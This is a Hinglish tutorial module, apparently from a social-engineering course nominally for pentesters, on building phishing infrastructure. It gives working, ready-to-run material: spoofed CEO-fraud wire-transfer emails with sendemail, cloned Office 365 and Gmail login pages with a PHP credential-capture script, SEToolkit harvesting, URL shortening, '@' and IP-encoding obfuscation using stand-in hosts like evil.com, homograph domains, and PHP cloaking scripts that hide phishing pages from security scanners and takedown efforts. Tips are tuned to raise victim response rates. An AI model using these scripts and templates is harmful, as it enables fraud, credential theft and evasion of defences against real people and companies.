### ‚å®Ô∏è Zaroori Commands & Steps:

**Install sendemail:**
```bash
# Kali Linux (pre-installed)
apt-get install sendemail

# Check installation
sendemail --help
```

**Basic Syntax:**
```bash
sendemail -f <from_email> -t <to_email> -u <subject> -m <message> -s <smtp_server> -xu <smtp_user> -xp <smtp_pass>
```

**Simple Spoofed Email:**
```bash
sendemail -f ceo@company.com \
-t victim@company.com \
-u "Urgent: Board Meeting" \
-m "Please review attached document before 5 PM." \
-s smtp.gmail.com:587 \
-xu your_gmail@gmail.com \
-xp your_password
```

**With Attachment:**
```bash
sendemail -f hr@company.com \
-t employee@company.com \
-u "January Salary Slip" \
-m "Dear Employee, Please find attached your salary slip." \
-a /path/to/malicious.pdf \
-s smtp.gmail.com:587 \
-xu your_gmail@gmail.com \
-xp your_password
```

**Advanced Options:**
```bash
sendemail -f ceo@company.com \
-t victim@company.com \
-u "URGENT: Wire Transfer Required" \
-m "Transfer $50,000 to vendor account immediately." \
-s smtp.gmail.com:587 \
-xu your_gmail@gmail.com \
-xp your_password \
-o tls=yes \
-o message-charset=utf-8 \
-o message-content-type=html
```

### üíª Step-by-Step Example:

**Scenario: CEO Fraud Attack**

**Step 1: OSINT (Target Research)**
```bash
# Identify CEO and CFO
LinkedIn: John Smith (CEO), Sarah Jones (CFO)
Email pattern: firstname.lastname@company.com

CEO email: john.smith@company.com
CFO email: sarah.jones@company.com
```

**Step 2: Setup SMTP (Gmail)**
```bash
# Create burner Gmail account
Email: pentester2024@gmail.com
Password: SecurePass123!

# Enable "Less secure apps" or use App Password
# Google Account ‚Üí Security ‚Üí App Passwords
```

**Step 3: Craft Phishing Email**
```bash
sendemail -f john.smith@company.com \
-t sarah.jones@company.com \
-u "URGENT: Confidential Acquisition Deal" \
-m "Sarah,

I'm in a board meeting and can't talk. We're finalizing a confidential acquisition.

Need immediate wire transfer:
Amount: $85,000
Account: [Attacker's account]
Reason: Legal fees for due diligence

This is time-sensitive. Board needs confirmation in 2 hours.
Do NOT discuss with anyone - NDA signed.

Regards,
John Smith
CEO, Company Inc.
Sent from my iPhone" \
-s smtp.gmail.com:587 \
-xu pentester2024@gmail.com \
-xp SecurePass123! \
-o tls=yes
```

**Step 4: Send Email**
```bash
# Execute command
# Output:
Jan 15 10:30:45 kali sendemail[1234]: Email sent successfully!
```

**Step 5: Monitor Response**
```bash
# Check burner email for replies
# Or setup fake reply-to address
-o reply-to=john.smith.urgent@gmail.com
```

**Step 6: Follow-up (If No Response)**
```bash
# Send reminder after 30 minutes
sendemail -f john.smith@company.com \
-t sarah.jones@company.com \
-u "Re: URGENT: Confidential Acquisition Deal" \
-m "Sarah, did you process the transfer? Board is asking for update. - John" \
-s smtp.gmail.com:587 \
-xu pentester2024@gmail.com \
-xp SecurePass123!
```

**Step 7: Analyze Results**
```
Success Indicators:
- Victim replies to email
- Victim calls "CEO" (your number)
- Money transferred (in real attack)
- Credentials entered (if phishing link included)

Failure Indicators:
- Email bounced (SPF/DMARC block)
- No response after 24 hours
- Victim reports to IT
```

### üí° Pro Tip / Galti:

**Pro Tip**: Email headers ko realistic banao using custom headers:

```bash
sendemail -f ceo@company.com \
-t victim@company.com \
-u "Subject" \
-m "Message" \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password \
-o message-header="X-Mailer: iPhone Mail (iOS 16.0)" \
-o message-header="X-Priority: 1" \
-o message-header="Importance: high"
```

Yeh email ko iPhone se bheja hua dikhata hai aur high priority mark karta hai!

**Common Mistake**: Generic email content use karna. Specific details add karo:

```
‚ùå Bad: "Please review attached document."

‚úì Good: "Please review Q4 financial projections for tomorrow's 3 PM board meeting with Goldman Sachs. We need your approval on the $2.5M marketing budget increase."

Specific details (time, company name, amount) = Higher credibility = Better success rate
```

Real example: Generic email = 15% response rate. Specific email with company details = 55% response rate. Lesson: Research pays off!

---

## üìö Topic 6.2: Technique - Website Cloning (Tool: Scrapbook / wget)

### üéØ Topic/Technique:
**Website Cloning** - Target website ka exact copy banana for credential harvesting using wget/httrack.

### ü§î Yeh Kya Hai?
Website cloning mein legitimate website (company login page, bank portal) ka complete copy download karte hain, phir credentials capture karne ke liye modify karte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Phishing pages banana ka fastest method
- Exact replica = High trust = Better success rate
- Credential harvesting ka foundation
- Client ko demonstrate karna ki unka login page clone ho sakta hai

### üéØ Practical Use (Asli Pentesting Mein):
- Fake login pages (Office 365, Gmail, company portal)
- Credential harvesting campaigns
- 2FA bypass attempts (real-time phishing)
- Banking trojans (fake bank login)

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Cloning Flow:**
```
wget downloads website ‚Üí Modify HTML (add credential capture) ‚Üí Host on attacker server ‚Üí Send phishing link ‚Üí Victim enters credentials ‚Üí Attacker captures ‚Üí Redirect to real site
```

### üëç Pros (Fayde):
- Exact replica (victim can't tell difference)
- Fast process (minutes mein clone ready)
- Works on any website
- No coding skills required

### üëé Cons (Nuksaan):
- Dynamic content may not work (JavaScript)
- HTTPS certificate mismatch (victim may notice)
- Some sites block cloning (anti-scraping)
- Requires web hosting

### ‚å®Ô∏è Zaroori Commands & Steps:

**Method 1: wget (Simple)**
```bash
# Clone single page
wget -k -p https://target.com/login

# Clone entire site (careful - can be huge!)
wget -r -l 2 -k -p https://target.com

# Clone with custom user-agent
wget --user-agent="Mozilla/5.0" -k -p https://target.com/login
```

**Method 2: httrack (Advanced)**
```bash
# Install
apt-get install httrack

# Clone website
httrack https://target.com -O /var/www/html/clone

# With options
httrack https://target.com \
-O /var/www/html/clone \
--depth=2 \
--max-rate=50000
```

**Method 3: curl (Quick)**
```bash
curl https://target.com/login > login.html
```

### üíª Step-by-Step Example:

**Scenario: Clone Office 365 Login Page**

**Step 1: Clone Page**
```bash
cd /var/www/html
mkdir office365-phish

wget -k -p -E -H -K -nd \
https://login.microsoftonline.com \
-P office365-phish/

# Options explained:
# -k: Convert links for local viewing
# -p: Download all page requisites (CSS, images)
# -E: Adjust extension (.html)
# -H: Span across hosts (for external resources)
# -K: Backup original files
# -nd: No directories (flat structure)
```

**Step 2: Modify HTML for Credential Capture**
```bash
cd office365-phish
nano login.html

# Find form tag:
<form method="POST" action="/login">

# Change to:
<form method="POST" action="capture.php">
```

**Step 3: Create Capture Script**
```php
<?php
// capture.php
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$timestamp = date('Y-m-d H:i:s');

// Save credentials
$data = "[$timestamp] IP: $ip | Email: $email | Password: $password\n";
file_put_contents('captured.txt', $data, FILE_APPEND);

// Redirect to real Office 365
header('Location: https://login.microsoftonline.com');
exit();
?>
```

**Step 4: Setup Web Server**
```bash
# Start Apache
service apache2 start

# Test locally
firefox http://localhost/office365-phish/login.html
```

**Step 5: Get Public Domain**
```bash
# Option 1: Free subdomain
# Use: afraid.org, duckdns.org
# Example: office365-login.duckdns.org

# Option 2: Similar domain
# Buy: micros0ft-login.com (zero instead of O)
# Or: office365-verify.com

# Option 3: URL shortener
# Use: bit.ly, tinyurl.com
# Example: bit.ly/office-verify
```

**Step 6: Send Phishing Email**
```bash
sendemail -f it@company.com \
-t employees@company.com \
-u "Action Required: Office 365 Password Expiring" \
-m "Your Office 365 password will expire in 24 hours.

Please verify your account to avoid service interruption:
https://office365-login.duckdns.org

IT Department" \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password
```

**Step 7: Monitor Captured Credentials**
```bash
# Real-time monitoring
tail -f /var/www/html/office365-phish/captured.txt

# Output:
[2024-01-15 10:45:23] IP: 192.168.1.50 | Email: john@company.com | Password: Summer2024!
[2024-01-15 10:47:15] IP: 192.168.1.51 | Email: sarah@company.com | Password: P@ssw0rd123
[2024-01-15 10:50:02] IP: 192.168.1.52 | Email: mike@company.com | Password: Welcome123!
```

**Step 8: Test Captured Credentials**
```bash
# Try logging into real Office 365
firefox https://login.microsoftonline.com

# Enter captured credentials
# If successful: Full email access!
```

### üí° Pro Tip / Galti:

**Pro Tip**: SSL certificate add karo using Let's Encrypt for HTTPS:

```bash
# Install certbot
apt-get install certbot python3-certbot-apache

# Get free SSL certificate
certbot --apache -d office365-login.duckdns.org

# Now your phishing site has HTTPS (green padlock)!
# Victim ko zyada trust hoga
```

**Common Mistake**: Cloned page mein broken images/CSS. Solution:

```bash
# After cloning, check for broken resources
grep -r "http://" *.html
grep -r "https://" *.html

# Fix absolute URLs to relative
sed -i 's|https://target.com/|./|g' *.html

# Or use httrack which handles this automatically
```

Real example: Ek pentester ne page clone kiya lekin CSS load nahi hua. Page ugly dikhne lagi, 0% victims ne credentials enter kiye. Usne httrack use kiya with proper options - perfect clone bana, 45% success rate! Lesson: Test your phishing page before sending!

---

## üìö Topic 6.3: Technique - Website Cloning (Tool: SEToolkit)

### üéØ Topic/Technique:
**SEToolkit (Social Engineer Toolkit)** - Automated phishing framework jo website clone aur credential harvesting karta hai.

### ü§î Yeh Kya Hai?
SEToolkit ek comprehensive social engineering framework hai jo website cloning, credential harvesting, mass mailer, aur bahut kuch automate karta hai. Yeh wget se zyada powerful hai kyunki backend bhi setup kar deta hai.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Complete phishing infrastructure ek tool mein
- Automated credential harvesting
- Built-in web server
- Email templates included
- Beginner-friendly interface

### üéØ Practical Use (Asli Pentesting Mein):
- Quick phishing campaigns
- Credential harvesting
- Client demonstrations
- Security awareness training

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?
SEToolkit website clone karta hai, credentials capture karne ke liye backend setup karta hai, built-in web server start karta hai, aur real-time captured credentials display karta hai.

### üëç Pros (Fayde):
- Fully automated (no manual coding)
- Built-in web server
- Real-time credential display
- Multiple attack vectors
- Regular updates

### üëé Cons (Nuksaan):
- Well-known tool (AV may detect)
- Limited customization
- Requires root privileges
- Cloned pages may have issues

### ‚å®Ô∏è Zaroori Commands & Steps:

**Launch SEToolkit:**
```bash
# Kali Linux (pre-installed)
setoolkit

# Or
cd /usr/share/setoolkit
./setoolkit
```

**Basic Workflow:**
```
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner

Enter URL to clone: https://login.microsoftonline.com
Enter IP for POST back: 192.168.1.10
```

### üíª Step-by-Step Example:

**Scenario: Clone Gmail Login Page**

**Step 1: Launch SEToolkit**
```bash
setoolkit

 Select from menu:
 1) Social-Engineering Attacks
 2) Penetration Testing (Fast-Track)
 3) Third Party Modules
 4) Update the Social-Engineer Toolkit
 5) Update SET configuration
 6) Help, Credits, and About

set> 1
```

**Step 2: Select Attack Vector**
```bash
 Select from menu:
 1) Spear-Phishing Attack Vectors
 2) Website Attack Vectors
 3) Infectious Media Generator
 4) Create a Payload and Listener
 5) Mass Mailer Attack
 6) Arduino-Based Attack Vector
 7) Wireless Access Point Attack Vector
 8) QRCode Generator Attack Vector
 9) Powershell Attack Vectors
 10) Third Party Modules

set> 2
```

**Step 3: Select Credential Harvester**
```bash
 1) Java Applet Attack Method
 2) Metasploit Browser Exploit Method
 3) Credential Harvester Attack Method
 4) Tabnabbing Attack Method
 5) Web Jacking Attack Method
 6) Multi-Attack Web Method
 7) HTA Attack Method

set:webattack> 3
```

**Step 4: Select Site Cloner**
```bash
 1) Web Templates
 2) Site Cloner
 3) Custom Import

set:webattack> 2
```

**Step 5: Configure Attack**
```bash
[-] Credential harvester will allow you to utilize the clone capabilities within SET
[-] to harvest credentials or parameters from a website as well as place them into a report

[-] Enter the IP address for the POST back in Harvester/Tabnabbing [192.168.1.10]: 192.168.1.10

[-] SET supports both HTTP and HTTPS
[-] Example: http://www.thisisafakesite.com

set:webattack> Enter the url to clone: https://accounts.google.com

[*] Cloning the website: https://accounts.google.com
[*] This could take a little bit...

[*] Injecting credential harvester into cloned website...
[*] Starting web server on port 80...
[*] Credential harvester is now listening...
```

**Step 6: Send Phishing Link**
```bash
# In another terminal
sendemail -f it@company.com \
-t victim@company.com \
-u "Google Account Security Alert" \
-m "Suspicious activity detected. Verify your account: http://192.168.1.10" \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password
```

**Step 7: Monitor Captured Credentials**
```bash
# SEToolkit terminal shows real-time captures:

[*] WE GOT A HIT! Printing the output:
PARAM: Email=victim@company.com
PARAM: Passwd=VictimPassword123!
PARAM: PersistentCookie=yes

[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
```

**Step 8: Generate Report**
```bash
# Press Ctrl+C in SEToolkit

[*] Generating report...
[*] Report saved to: /root/.set/reports/

# View report
cat /root/.set/reports/2024-01-15.html
```

### üí° Pro Tip / Galti:

**Pro Tip**: SEToolkit ke templates use karo for common sites:

```bash
# Instead of Site Cloner, select Web Templates
set:webattack> 1

Available templates:
1) Google
2) Facebook
3) Twitter
4) Yahoo
5) LinkedIn
...

# Pre-made templates = Faster deployment
```

**Common Mistake**: SEToolkit ko public IP par run karna without firewall. Solution:

```bash
# Setup firewall rules
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Or use SSH tunnel for remote access
ssh -L 8080:localhost:80 user@attacker-server
```

---

## üìö Topic 6.4: Technique - URL Manipulation (tinyurl)

### üéØ Topic/Technique:
**URL Shortening & Obfuscation** - Phishing links ko legitimate dikhane ke liye URL shorteners aur obfuscation techniques.

### ü§î Yeh Kya Hai?
URL manipulation mein phishing links ko short, clean, ya legitimate dikhane ke liye various techniques use karte hain. URL shorteners (bit.ly, tinyurl) long suspicious URLs ko short URLs mein convert karte hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Long phishing URLs suspicious lagte hain
- Short URLs click rate 2-3x badha dete hain
- Email filters bypass karne mein madad
- Professional appearance

### üéØ Practical Use (Asli Pentesting Mein):
- Phishing campaigns (email, SMS)
- Social media attacks
- QR code phishing
- Bypassing URL filters

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Before URL Shortening:**
```
http://192.168.1.10/office365-phishing/login.php?redirect=https://evil.com
‚Üì Suspicious! Long, has IP address, "phishing" in URL
```

**After URL Shortening:**
```
https://bit.ly/office-login
‚Üì Clean, short, looks legitimate
```

### üëç Pros (Fayde):
- Clean appearance
- Higher click rate
- Bypasses some filters
- Tracking analytics (bit.ly provides click stats)

### üëé Cons (Nuksaan):
- Some users know to avoid shortened URLs
- URL preview tools can reveal real destination
- Some email gateways block shorteners
- Shortener service may suspend malicious links

### ‚å®Ô∏è Zaroori Commands & Steps:

**Popular URL Shorteners:**
```
1. bit.ly - Most popular, analytics included
2. tinyurl.com - No account needed
3. is.gd - Simple, anonymous
4. rebrandly.com - Custom domains
5. cutt.ly - Custom short URLs
```

**Using TinyURL (No Account):**
```bash
# Manual (browser)
1. Go to https://tinyurl.com
2. Paste long URL
3. Click "Make TinyURL!"
4. Copy short URL

# Automated (curl)
curl "http://tinyurl.com/api-create.php?url=http://192.168.1.10/phishing"

# Output: http://tinyurl.com/abc123
```

**Using Bit.ly (With Account):**
```bash
# Get API token from bit.ly account
# Then use API

curl -X POST "https://api-ssl.bitly.com/v4/shorten" \
-H "Authorization: Bearer YOUR_API_TOKEN" \
-H "Content-Type: application/json" \
-d '{"long_url":"http://192.168.1.10/phishing"}'

# Output: {"link":"https://bit.ly/xyz789"}
```

### üíª Step-by-Step Example:

**Scenario: Shorten Phishing URL for Email Campaign**

**Step 1: Setup Phishing Page**
```bash
# Clone Office 365 login
cd /var/www/html
wget -k -p https://login.microsoftonline.com

# Original URL (suspicious):
http://192.168.1.10/login.microsoftonline.com/index.html
```

**Step 2: Get Better Domain**
```bash
# Option 1: Use DuckDNS (free subdomain)
# Register at duckdns.org
# Create subdomain: office365-verify.duckdns.org

# Update DNS
curl "https://www.duckdns.org/update?domains=office365-verify&token=YOUR_TOKEN&ip=192.168.1.10"

# New URL (better but still long):
http://office365-verify.duckdns.org/login.microsoftonline.com/index.html
```

**Step 3: Shorten URL**
```bash
# Use TinyURL
curl "http://tinyurl.com/api-create.php?url=http://office365-verify.duckdns.org/login.microsoftonline.com/index.html"

# Output: http://tinyurl.com/office-verify

# Or use Bit.ly for analytics
curl -X POST "https://api-ssl.bitly.com/v4/shorten" \
-H "Authorization: Bearer YOUR_TOKEN" \
-H "Content-Type: application/json" \
-d '{"long_url":"http://office365-verify.duckdns.org/login.microsoftonline.com/index.html"}'

# Output: https://bit.ly/3xYz789
```

**Step 4: Customize Short URL (Bit.ly)**
```bash
# Create custom back-half
curl -X POST "https://api-ssl.bitly.com/v4/shorten" \
-H "Authorization: Bearer YOUR_TOKEN" \
-H "Content-Type: application/json" \
-d '{"long_url":"http://office365-verify.duckdns.org/login","custom_bitlinks":["bit.ly/office-login"]}'

# Output: https://bit.ly/office-login (custom!)
```

**Step 5: Send Phishing Email**
```bash
sendemail -f it@company.com \
-t employees@company.com \
-u "Office 365 Password Expiring Soon" \
-m "Your password expires in 24 hours. 

Update now to avoid service interruption:
https://bit.ly/office-login

IT Department" \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password
```

**Step 6: Track Clicks (Bit.ly Analytics)**
```bash
# Check click statistics
curl "https://api-ssl.bitly.com/v4/bitlinks/bit.ly/office-login/clicks" \
-H "Authorization: Bearer YOUR_TOKEN"

# Output:
{
  "link_clicks": [
    {"date": "2024-01-15", "clicks": 45},
    {"date": "2024-01-16", "clicks": 23}
  ]
}

# 68 total clicks in 2 days!
```

### üí° Pro Tip / Galti:

**Pro Tip**: URL preview bypass karo using redirect chains:

```bash
# Step 1: Shorten legitimate URL
http://tinyurl.com/company-news (points to company.com/news)

# Step 2: After campaign starts, change redirect
# Edit tinyurl settings ‚Üí Change destination to phishing site

# Result: 
# - URL preview shows legitimate site
# - Actual click goes to phishing site
# - Victim doesn't suspect
```

**Common Mistake**: Obvious phishing keywords in custom URLs:

```
‚ùå Bad: bit.ly/phishing-login
‚ùå Bad: bit.ly/fake-office365
‚ùå Bad: bit.ly/steal-password

‚úì Good: bit.ly/office-verify
‚úì Good: bit.ly/account-update
‚úì Good: bit.ly/security-check
```

---

## üìö Topic 6.5: Technique - URL Manipulation (@ Trick & Domain Obfuscator)

### üéØ Topic/Technique:
**Advanced URL Obfuscation** - @ symbol aur IP encoding use karke phishing URLs ko legitimate dikhana.

### ü§î Yeh Kya Hai?
URL obfuscation techniques jismein URL structure ko manipulate karke victim ko confuse karte hain. @ trick aur IP encoding sabse common methods hain.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- URL filters bypass karne ke liye
- Victim ko legitimate URL dikhane ke liye
- Email gateway evasion
- Browser address bar spoofing

### üéØ Practical Use (Asli Pentesting Mein):
- Advanced phishing campaigns
- Bypassing URL blacklists
- Social engineering (victim ko confuse karna)
- Email security testing

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**@ Trick:**
```
Normal URL: http://evil.com/phishing
With @ trick: http://google.com@evil.com/phishing

Browser interprets:
- Everything before @ = username (ignored)
- Everything after @ = actual domain

Victim sees: "google.com" in URL
Actually goes to: evil.com
```

**IP Encoding:**
```
Normal: http://192.168.1.10
Decimal: http://3232235786
Hex: http://0xC0A8010A
Octal: http://0300.0250.0001.0012

All point to same IP but look different!
```

### üëç Pros (Fayde):
- Bypasses simple URL filters
- Confuses victims
- Multiple encoding options
- Works in most browsers

### üëé Cons (Nuksaan):
- Modern browsers show warnings
- Sophisticated filters detect
- Looks suspicious to trained users
- Some browsers block @ in URLs

### ‚å®Ô∏è Zaroori Commands & Steps:

**@ Trick Examples:**
```
http://microsoft.com@evil.com
http://login.office365.com@192.168.1.10
http://accounts.google.com@phishing-site.com
```

**IP Encoding:**
```bash
# Decimal encoding
# IP: 192.168.1.10
# Formula: (192 √ó 256¬≥) + (168 √ó 256¬≤) + (1 √ó 256) + 10
# Result: 3232235786

# Python calculator
python3 -c "print((192 << 24) + (168 << 16) + (1 << 8) + 10)"
# Output: 3232235786

# Use in URL
http://3232235786/phishing
```

**Hex Encoding:**
```bash
# IP: 192.168.1.10
# Hex: C0.A8.01.0A

# Use in URL
http://0xC0A8010A/phishing
# Or
http://0xC0.0xA8.0x01.0x0A/phishing
```

**Domain Obfuscator Tool:**
```bash
# Install
git clone https://github.com/vysecurity/DomainObfuscator
cd DomainObfuscator
python3 domainobfuscator.py

# Input: http://192.168.1.10/phishing
# Output: Multiple obfuscated versions
```

### üíª Step-by-Step Example:

**Scenario: Obfuscate Phishing URL**

**Step 1: Original Phishing URL**
```
http://192.168.1.10/office365-phishing/login.html
```

**Step 2: Apply @ Trick**
```
http://login.microsoftonline.com@192.168.1.10/office365-phishing/login.html

Victim sees: "login.microsoftonline.com" (legitimate!)
Actually goes to: 192.168.1.10 (attacker!)
```

**Step 3: Encode IP (Decimal)**
```bash
# Convert 192.168.1.10 to decimal
python3 -c "print((192 << 24) + (168 << 16) + (1 << 8) + 10)"
# Output: 3232235786

# New URL
http://login.microsoftonline.com@3232235786/office365-phishing/login.html
```

**Step 4: Add URL Encoding**
```
# Encode special characters
http://login.microsoftonline.com%40323223578%36/office365-phishing/login.html

# %40 = @
# %36 = 6
```

**Step 5: Combine with URL Shortener**
```bash
# Shorten obfuscated URL
curl "http://tinyurl.com/api-create.php?url=http://login.microsoftonline.com@3232235786/office365-phishing/login.html"

# Output: http://tinyurl.com/ms-login

# Final URL looks completely clean!
```

**Step 6: Test in Email**
```bash
sendemail -f it@company.com \
-t victim@company.com \
-u "Microsoft Account Verification" \
-m "Verify your account: http://tinyurl.com/ms-login" \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password
```

**Step 7: Advanced - HTML Link Manipulation**
```html
<!-- Email body (HTML) -->
<a href="http://192.168.1.10/phishing">https://login.microsoftonline.com</a>

<!-- Victim sees: https://login.microsoftonline.com (in blue, underlined)
     Actually clicks: http://192.168.1.10/phishing -->
```

### üí° Pro Tip / Galti:

**Pro Tip**: Homograph attack use karo (similar-looking characters):

```
Real domain: microsoft.com
Fake domain: micr0soft.com (zero instead of O)
Fake domain: micros–æft.com (Cyrillic –æ instead of Latin o)

URL: http://micros–æft.com@evil.com
Looks like: microsoft.com (hard to notice difference!)
```

**Common Mistake**: @ trick ko directly email mein use karna. Modern email clients warning dikhate hain. Solution:

```
Step 1: @ trick URL banao
Step 2: URL shorten karo (hides @ trick)
Step 3: Shortened URL email mein bhejo

Example:
http://google.com@evil.com ‚Üí bit.ly/search ‚Üí Email
Victim clicks bit.ly ‚Üí Redirects to evil.com
```

---

## üìö Topic 6.6: Technique - Phishing Redirectors (Cloaking)

### üéØ Topic/Technique:
**Phishing Redirectors & Cloaking** - Security scanners ko legitimate content dikhana aur real users ko phishing page.

### ü§î Yeh Kya Hai?
Cloaking ek technique hai jismein server user-agent, IP address, ya other factors check karke decide karta hai ki legitimate content dikhana hai ya phishing page. Security scanners ko legitimate page dikhta hai, real victims ko phishing page.

### üõ°Ô∏è Pentester ke liye Kyun Zaroori Hai?
- Email gateway scanners bypass karne ke liye
- URL reputation services ko fool karne ke liye
- Phishing pages ko lamba time tak active rakhne ke liye
- Detection avoid karne ke liye

### üéØ Practical Use (Asli Pentesting Mein):
- Long-term phishing campaigns
- Bypassing automated scanners
- Evading takedown requests
- Advanced persistent phishing

### ‚öôÔ∏è Yeh Kaise Kaam Karta Hai?

**Cloaking Logic:**
```
User visits URL ‚Üí Server checks:
1. User-Agent (browser vs scanner?)
2. IP address (security company vs victim?)
3. Referrer (direct link vs email?)
4. Cookies (first visit vs repeat?)

If scanner ‚Üí Show legitimate content
If victim ‚Üí Show phishing page
```

### üëç Pros (Fayde):
- Bypasses automated scanners
- Longer campaign lifetime
- Lower detection rate
- Professional approach

### üëé Cons (Nuksaan):
- Requires server-side scripting
- Complex setup
- May block legitimate users
- Sophisticated scanners can detect

### ‚å®Ô∏è Zaroori Commands & Steps:

**Basic PHP Cloaking:**
```php
<?php
// cloak.php

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = $_SERVER['REMOTE_ADDR'];

// Blacklist security scanners
$scanners = array('bot', 'crawler', 'spider', 'scan', 'check');

foreach($scanners as $scanner) {
    if(stripos($user_agent, $scanner) !== false) {
        // Show legitimate content
        header('Location: https://microsoft.com');
        exit();
    }
}

// Blacklist security company IPs
$blocked_ips = array('8.8.8.8', '1.1.1.1'); // Example IPs

if(in_array($ip, $blocked_ips)) {
    header('Location: https://microsoft.com');
    exit();
}

// Show phishing page to real users
include('phishing.html');
?>
```

**Advanced Cloaking (Geo-based):**
```php
<?php
// geo_cloak.php

$ip = $_SERVER['REMOTE_ADDR'];

// Get geolocation
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

// Only show phishing to specific country
if($geo->country != 'United States') {
    header('Location: https://microsoft.com');
    exit();
}

// Check if corporate IP range
if(strpos($ip, '192.168.') === 0) {
    // Show phishing (internal network)
    include('phishing.html');
} else {
    // Redirect (external)
    header('Location: https://microsoft.com');
}
?>
```

### üíª Step-by-Step Example:

**Scenario: Cloaked Office 365 Phishing**

**Step 1: Create Phishing Page**
```bash
cd /var/www/html
mkdir cloaked-phish
cd cloaked-phish

# Clone Office 365
wget -k -p https://login.microsoftonline.com
mv login.microsoftonline.com phishing.html
```

**Step 2: Create Cloaking Script**
```php
<?php
// index.php

function is_scanner() {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    
    $scanner_keywords = [
        'bot', 'crawler', 'spider', 'scan', 'check',
        'curl', 'wget', 'python', 'java', 'perl',
        'security', 'monitor', 'test', 'probe'
    ];
    
    foreach($scanner_keywords as $keyword) {
        if(strpos($user_agent, $keyword) !== false) {
            return true;
        }
    }
    
    return false;
}

function is_security_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    
    // Known security company IP ranges
    $blocked_ranges = [
        '8.8.8.', // Google
        '1.1.1.', // Cloudflare
        '208.67.', // OpenDNS
    ];
    
    foreach($blocked_ranges as $range) {
        if(strpos($ip, $range) === 0) {
            return true;
        }
    }
    
    return false;
}

// Log all visits
$log = date('Y-m-d H:i:s') . " | IP: {$_SERVER['REMOTE_ADDR']} | UA: {$_SERVER['HTTP_USER_AGENT']}\n";
file_put_contents('visits.log', $log, FILE_APPEND);

// Cloaking logic
if(is_scanner() || is_security_ip()) {
    // Show legitimate Microsoft page
    header('Location: https://www.microsoft.com/en-us/microsoft-365');
    exit();
}

// Check if first visit (cookie-based)
if(!isset($_COOKIE['visited'])) {
    setcookie('visited', '1', time() + 3600);
    // Show phishing page
    include('phishing.html');
} else {
    // Repeat visit - redirect to real site
    header('Location: https://login.microsoftonline.com');
    exit();
}
?>
```

**Step 3: Setup Web Server**
```bash
# Start Apache
service apache2 start

# Test cloaking
curl http://localhost/cloaked-phish/
# Output: Redirects to microsoft.com (detected as scanner!)

firefox http://localhost/cloaked-phish/
# Output: Shows phishing page (real browser)
```

**Step 4: Deploy & Send Phishing**
```bash
# Get public domain
# Example: office-verify.duckdns.org

# Send phishing email
sendemail -f it@company.com \
-t employees@company.com \
-u "Office 365 Security Update" \
-m "Update your account: http://office-verify.duckdns.org/cloaked-phish/" \
-s smtp.gmail.com:587 \
-xu your_email@gmail.com \
-xp your_password
```

**Step 5: Monitor Logs**
```bash
# Check who visited
tail -f /var/www/html/cloaked-phish/visits.log

# Output:
2024-01-15 10:30:15 | IP: 8.8.8.8 | UA: Mozilla/5.0 (compatible; Google-Safety)
‚Üí Redirected to microsoft.com (scanner detected)

2024-01-15 10:35:22 | IP: 192.168.1.50 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
‚Üí Showed phishing page (real user)

2024-01-15 10:36:45 | IP: 192.168.1.50 | UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
‚Üí Redirected to real site (repeat visit)
```

### üí° Pro Tip / Galti:

**Pro Tip**: Time-based cloaking add karo:

```php
<?php
// Only show phishing during business hours
$hour = date('H');
$day = date('N'); // 1=Monday, 7=Sunday

if($hour < 9 || $hour > 17 || $day > 5) {
    // Outside business hours or weekend
    header('Location: https://microsoft.com');
    exit();
}

// Business hours - show phishing
include('phishing.html');
?>
```

**Common Mistake**: Sabhi bots ko block karna. Legitimate search engine bots (Google, Bing) ko allow karo warna site indexed nahi hogi aur suspicious lagega. Solution:

```php
$allowed_bots = ['googlebot', 'bingbot'];
$is_allowed = false;

foreach($allowed_bots as $bot) {
    if(stripos($user_agent, $bot) !== false) {
        $is_allowed = true;
        break;
    }
}

if($is_allowed) {
    // Show legitimate content
} else if(is_scanner()) {
    // Block other scanners
} else {
    // Show phishing to real users
}
```

---

## üéì Module 6 Complete!

Aapne successfully Module 6 ke saare topics cover kar liye:
‚úÖ 6.1: Email Spoofing (sendemail)
‚úÖ 6.2: Website Cloning (wget/httrack)
‚úÖ 6.3: Website Cloning (SEToolkit)
‚úÖ 6.4: URL Manipulation (tinyurl)
‚úÖ 6.5: URL Manipulation (@ Trick & Obfuscation)
‚úÖ 6.6: Phishing Redirectors (Cloaking)

**Key Takeaways:**
- Phishing infrastructure = Foundation of SE attacks
- Multiple layers of obfuscation = Better evasion
- Cloaking = Long-term campaign success
- Always test before deployment

**Complete Progress:**
1. ‚úÖ Module 1: Foundation & Human Psychology (6 topics)
2. ‚úÖ Module 2: Information Gathering (OSINT) (6 topics)
3. ‚úÖ Module 3: Weaponization 1 (Windows Payloads) (6 topics)
4. ‚úÖ Module 4: Weaponization 2 (Advanced Evasion) (8 topics)
5. ‚úÖ Module 5: Weaponization 3 (Cross-Platform) (6 topics)
6. ‚úÖ Module 6: Phishing Infrastructure (6 topics)

**Total: 38 topics completed! üéâ**

Next: Module 7 (Advanced Phishing Campaigns) üöÄ

=============================================================

